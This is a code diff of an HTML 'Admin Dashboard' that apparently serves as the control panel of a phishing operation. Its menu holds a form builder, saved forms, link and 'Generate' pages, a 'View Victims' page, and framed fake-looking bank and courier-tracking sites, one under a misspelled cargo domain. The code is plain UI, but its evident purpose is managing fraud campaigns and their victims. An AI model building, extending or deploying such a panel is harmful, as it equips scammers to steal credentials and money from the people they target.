@@ -1,210 +1,109 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Admin Dashboard</title>
-
-<style>
-  html, body {
-    margin: 0; padding: 0; height: 100%;
-    font-family: Arial, sans-serif;
-    color: white;
-    overflow: hidden;
-    background: black;
-  }
-  #backgroundCanvas {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw; height: 100vh;
-    z-index: 0;
-    pointer-events: none;
-    background: black;
-  }
-  .header {
-    background: rgba(0,0,0,0.8);
-    color: #0f0;
-    padding: 10px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    position: relative;
-    z-index: 10;
-    font-family: monospace;
-  }
-  .header img { height: 50px; }
-
-  /* Sidebar */
-  .sidebar {
-    position: fixed;
-    top: 70px; left: 0;
-    width: 220px;
-    height: calc(100% - 70px);
-    background: rgba(0,0,0,0.9);
-    padding: 15px 10px;
-    display: none;
-    flex-direction: column;
-    gap: 10px;
-    z-index: 20;
-    font-family: monospace;
-    overflow-y: auto;
-  }
-  .sidebar a {
-    color: #0f0;
-    text-decoration: none;
-    font-weight: bold;
-    background: rgba(0,0,0,0.6);
-    padding: 10px;
-    border-radius: 5px;
-    display: block;
-    transition: background 0.3s ease;
-    cursor: pointer;
-  }
-  .sidebar a:hover {
-    background: rgba(0,255,0,0.3);
-  }
-
-  .content {
-    margin-top: 70px;
-    height: calc(100% - 70px);
-    padding: 10px;
-    overflow: auto;
-    position: relative;
-    z-index: 5;
-    background: rgba(0,0,0,0.7);
-  }
-
-  iframe {
-    width: 100%;
-    height: 100%;
-    border: none;
-    background: #111;
-  }
-
-  #logoutBtn, #menuBtn {
-    background: none;
-    border: 1px solid #0f0;
-    color: #0f0;
-    cursor: pointer;
-    font-family: monospace;
-    padding: 5px 15px;
-    border-radius: 5px;
-    transition: background 0.3s ease;
-  }
-  #logoutBtn:hover, #menuBtn:hover {
-    background: #0f0;
-    color: black;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🚀 Dashboard</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: white;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      background: #000;
+      padding: 10px;
+    }
+    .menu-btn {
+      font-size: 22px;
+      background: none;
+      border: none;
+      color: white;
+      cursor: pointer;
+      margin-right: 15px;
+    }
+    .logo {
+      height: 40px;
+    }
+    .sidebar {
+      position: fixed;
+      top: 0;
+      left: -250px;
+      width: 250px;
+      height: 100%;
+      background: #222;
+      padding-top: 60px;
+      transition: 0.3s;
+      z-index: 1000;
+    }
+    .sidebar a {
+      display: block;
+      padding: 12px;
+      color: white;
+      text-decoration: none;
+      border-bottom: 1px solid #333;
+    }
+    .sidebar a:hover {
+      background: #444;
+    }
+    .sidebar.show {
+      left: 0;
+    }
+    .content {
+      margin-top: 0;
+      width: 100%;
+      height: calc(100vh - 50px);
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      background: #111;
+    }
+  </style>
 </head>
 <body>
 
-<canvas id="backgroundCanvas"></canvas>
+  <div class="header">
+    <button class="menu-btn" onclick="toggleMenu()">☰</button>
+    <img src="logo.png" alt="Logo" class="logo" id="dashboardLogo">
+    <h2 style="margin-left:10px;">Dashboard</h2>
+  </div>
 
-<div class="header">
-  <button id="menuBtn">☰ Menu</button>
-  <h1>ADMIN DASHBOARD</h1>
-  <button id="logoutBtn">Logout</button>
-</div>
+  <div class="sidebar" id="sidebar">
+    <a href="#" onclick="loadPage('bank.html')">🏛️ Bank</a>
+    <a href="#" onclick="loadPage('federal.html')">📦 Federal (Tracking Carrier)</a>
+    <a href="#" onclick="loadPage('form-builder.html')">📑 Form Builder</a>
+    <a href="#" onclick="loadPage('saved-forms.html')">💾 Saved Forms</a>
+    <a href="#" onclick="loadPage('feedback.html')">💬 Feedback</a>
+    <a href="#" onclick="loadPage('view-victims.html')">👥 View Victims</a>
+    <a href="#" onclick="loadPage('members.html')">👤 Members</a>
+    <a href="#" onclick="loadPage('links.html')">🔗 Links</a>
+    <a href="#" onclick="loadPage('generate.html')">⚡ Generate</a>
+    <a href="#" onclick="loadPage('emergency.html')">🚨 Emergency Message</a>
+  </div>
 
-<!-- Sidebar -->
-<div class="sidebar" id="sidebarMenu">
-  <a onclick="openPage('form-builder')">🎨 Form Builder</a>
-  <a onclick="openPage('forms')">💾 Saved Forms</a>
-  <a onclick="openPage('feedback')">📝 Feedback</a>
-  <a onclick="openPage('victims')">🧠 View Victims</a>
-  <a onclick="openPage('members')">👥 Members</a>
-  <a onclick="openPage('links')">🔗 Links</a>
-  <a onclick="openPage('generate')">🧾 Generate</a>
-  <a onclick="openPage('bank')">🏦 Bank</a>
-  <a onclick="openPage('tracking')">📦 Tracking (Carrier Federal)</a>
-</div>
+  <div class="content">
+    <iframe id="mainFrame" src=""></iframe>
+  </div>
 
-<!-- Main content -->
-<div class="content" id="mainContent">
-  <h2>Welcome to the Dashboard</h2>
-  <p>Select a menu option to load content.</p>
-</div>
-
-<script>
-  const sidebar = document.getElementById("sidebarMenu");
-  const menuBtn = document.getElementById("menuBtn");
-  const contentDiv = document.getElementById("mainContent");
-
-  // Toggle sidebar
-  menuBtn.addEventListener("click", () => {
-    sidebar.style.display = sidebar.style.display === "flex" ? "none" : "flex";
-  });
-
-  // Load pages
-  function openPage(page) {
-    sidebar.style.display = "none";
-
-    const localPages = {
-      'form-builder': "Social-media-links/build.html",
-      'forms': "Social-media-links/forms.html",
-      'feedback': "Social-media-links/feedback.html",
-      'victims': "Social-media-links/victims.html",
-      'members': "Social-media-links/members.html",
-      'links': "Social-media-links/links.html",
-      'generate': "Social-media-links/generate.html",
-    };
-
-    const iframePages = {
-      'bank': "https://bulksms4.github.io/BANKING/",
-      'tracking': "https://x-cargo-exprees.web.app/"
-    };
-
-    if (localPages[page]) {
-      fetch(localPages[page])
-        .then(res => {
-          if (!res.ok) throw new Error("Page not found");
-          return res.text();
-        })
-        .then(html => {
-          // Extract only <body> contents so the dashboard stays intact
-          const parser = new DOMParser();
-          const doc = parser.parseFromString(html, "text/html");
-          const bodyContent = doc.body.innerHTML;
-          contentDiv.innerHTML = bodyContent;
-        })
-        .catch(err => {
-          contentDiv.innerHTML = `<h2 style="color:red;">❌ ${err.message}</h2>`;
-        });
+  <script>
+    function toggleMenu() {
+      document.getElementById("sidebar").classList.toggle("show");
     }
-    else if (iframePages[page]) {
-      contentDiv.innerHTML = `<iframe src="${iframePages[page]}"></iframe>`;
-    }
-  }
 
-  /* Matrix Background */
-  const canvas = document.getElementById('backgroundCanvas');
-  const ctx = canvas.getContext('2d');
-  let width, height;
-  function resizeCanvas() {
-    width = canvas.width = window.innerWidth;
-    height = canvas.height = window.innerHeight;
-  }
-  window.addEventListener('resize', resizeCanvas);
-  resizeCanvas();
-  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%';
-  const fontSize = 16;
-  let columns = Math.floor(width / fontSize);
-  const drops = new Array(columns).fill(1);
-  function draw() {
-    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-    ctx.fillRect(0, 0, width, height);
-    ctx.fillStyle = '#0F0';
-    ctx.font = fontSize + 'px monospace';
-    for (let i = 0; i < drops.length; i++) {
-      const text = letters.charAt(Math.floor(Math.random() * letters.length));
-      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-      if (drops[i] * fontSize > height && Math.random() > 0.975) drops[i] = 0;
-      drops[i]++;
+    function loadPage(page) {
+      document.getElementById("mainFrame").src = page;
+      document.getElementById("sidebar").classList.remove("show");
     }
-    requestAnimationFrame(draw);
-  }
-  draw();
-</script>
+
+    // Load logo dynamically if admin sets a new one
+    function setLogo(url) {
+      document.getElementById("dashboardLogo").src = url;
+    }
+  </script>
 </body>
 </html>
